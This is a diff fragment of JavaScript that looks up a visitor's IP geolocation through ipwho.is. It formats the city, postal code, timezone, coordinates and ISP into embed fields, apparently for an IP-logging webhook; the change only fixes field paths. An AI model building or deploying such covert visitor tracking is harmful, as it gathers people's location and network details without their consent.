@@ -36,11 +36,11 @@ $.getJSON("https://ipwho.is/", function(data) {
           },
           {
             "name": "GeoLocation Info",
-            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.current_time}, ${data.offset}, ${data.id}, {$data.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
+            "value": `>>> Town, State: ${data.city}, ${data.region}\nRegion: ${data.region}\nCountry: ${data.country}\nPostal Code: ${data.postal}\nTime Zone: ${data.timezone.current_time}, ${data.timezone.offset}, ${data.id}, ${data.abbr}\nLong/Lat: ${data.latitude}, ${data.longitude}`
           },
           {
             "name": "Network Info",
-            "value": `>>> HostName: ${data.org}\nISP: ${data.isp}`
+            "value": `>>> HostName: ${data.connection.org}\nISP: ${data.connection.isp}`
           },
           {
             "name": "Device Info",
